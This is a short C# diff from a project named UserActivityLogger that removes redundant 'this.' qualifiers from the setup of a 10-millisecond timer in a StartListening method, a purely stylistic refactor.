@@ -30,10 +30,10 @@ namespace UserActivityLogger
         }
         public void StartListening()
         {
-            this.timerKeyMine = new System.Timers.Timer();
-            this.timerKeyMine.Enabled = true;
-            this.timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(this.timerKeyMine_Elapsed);
-            this.timerKeyMine.Interval = 10;
+            timerKeyMine = new System.Timers.Timer();
+            timerKeyMine.Enabled = true;
+            timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(timerKeyMine_Elapsed);
+            timerKeyMine.Interval = 10;
         }
 
         public void CleanBuffer()
